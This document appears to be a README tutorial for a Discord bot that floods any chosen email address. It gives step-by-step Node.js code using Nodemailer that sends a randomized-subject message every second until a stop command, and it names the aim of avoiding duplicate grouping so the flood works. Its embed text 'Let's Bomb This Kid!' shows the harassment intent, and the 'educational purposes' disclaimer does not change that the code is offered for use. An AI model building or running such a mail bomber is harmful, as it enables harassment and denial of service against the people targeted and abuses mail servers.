# Discord Bot E-mail Bomber
## Warning!
This bot is against Discord ToS and can get you banned for using it!  
I'm not responsible for anything that is done/happens with this source code.
This code is strictly for educational purposes.
By copying or using any of the code below you agree that you have read this.

## Description
With this bot, you can bomb any email address by running a simple command.  
The E-mail subject and body will be randomized in all new mails, so there is not any chance that a new mail is a reply to the first.  
All this complex system is activated by the simple command ```!send mail@mail.com```  

## Installing
First, we need to install [Nodemailer](https://nodemailer.com/about/) using. npm  
```bash
npm install nodemailer --save
```

## Starting
Now we need to declare nodemailer at the bottom of our code and a boolean called "spamming" that will be used later in the code.
```javascript
const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = "!"
const nodemailer = require("nodemailer");
var spamming;
```

## Client On Message
It's time to start coding, you can find the whole code in index.js or follow this guide to create your own.  
In this bit of code we declare args and some other stuff that is required on the message event.
```javascript
client.on('message', async msg => {
    var args = msg.content.split(' ').slice(1);
    var command = msg.content.toLowerCase().slice(prefix.length).split(' ')[0];
    if(msg.author.bot) return;
 ```
## Send Command
We need to create our send command and make a function to randomize the emails to avoid duplicates.
Duplicates are bad because it will stack in the inbox and not be effective.

```javascript    
if (command === 'send') {
  if (spamming == true) return msg.reply("A mail bombing is already active! Please use '!stop' before a new attack"); //Check if the spamming variable is true

    if (!args[0]) 
        return  msg.reply("You need to insert a mail target!"); //If email is not specified, you get this reply message.

        
        function randomLetters(length) { //Here you create your random letters and number function.
          var text = "";
          var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          for (var i = 0; i < length; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));
             return text;
          }

       
          
        var mailto = args[0] //the variable mailto will be the arg[0] (the target e-mail)
        var mailtxt = (randomLetters(10)) //The mail's text will be 10 random letters and numbers choosed by the var "possible"
 ```
        
##  SMTP Server Connection
Now let's create the connection with the smtp server
WARNING: If you are using gmail under user and pass you put the email and password. YOU MUST HAVE LESS SECURE APPS ON TO USE GMAIL!
```javascript
        let transporter = nodemailer.createTransport({
            host: "server", //smtp server
            port: 25,
            secure: false, // true for 465, false for other ports
            auth: {
              user: 'mail', 
              pass: 'password' 
            }
          });
```
##  E-Mail Config
And now we make the config for the emails
```javascript
let mailOptions = {
            from: '"Name" <e-mail>', // sender address
            to: mailto, // list of receivers, in this case, the "mailto" variable
            subject: (randomLetters(8)), // Subject is made by 8 random characters
            text: mailtxt, // text body, made from mailtxt variable
            html: "<b>" + mailtxt + "</b>" // html body
          };
```
##  Spamming Process
Here is where we make our spam functions and setInterval to make it keep spamming.

```javascript
async function sendMail() {
          let info = await transporter.sendMail(mailOptions) //You load the mail options
          spamming = true; //You set the variable "spamming" to true, when it's on true, you can't launch other attacks
          }
          

            const spammingMessage = setInterval(() => { //You make a loop of the command, so it spams over and over
              var mailto = args[0]
                  mailOptions.subject = (randomLetters(8)) //You change the mail object, so it's everytime a new email and not a reply to the first one
                  var mailtxt = (randomLetters(10))
          
                      sendMail();
                      
                  }, 1000);

        msg.channel.send({embed: { //You create an embed with all the informations
            color: 3447003,
            author: {
              name: client.user.username,
              icon_url: client.user.avatarURL
            },
            title: "Bombing",
            description: "Bot Developed By Mental#1424",
            fields: [{
                name: "Let's Bomb This Kid!",
                value: "Bombing In Progress..."
              },
            {
                name: "Target Mail",
                value: mailto,
              },

            ],
            timestamp: new Date(),
            footer: {
              icon_url: client.user.avatarURL,
              text: "© Discord Mail Bomber"
            }
            
            
          }
          
        });
      }
```
##  Stopping The bombing
The stop command:
```javascript 
if(command === "stop") { //Stop the mail bombing
        if (spamming == false) return msg.reply("There isn't any active bombing!") //if you are not spamming, you can't stop the mail bombing.
        msg.channel.send("Stopped! Bot Shutdown")
        client.destroy() //The bot shut down | You might have to resolve a promise here, not sure about that.
    }
```
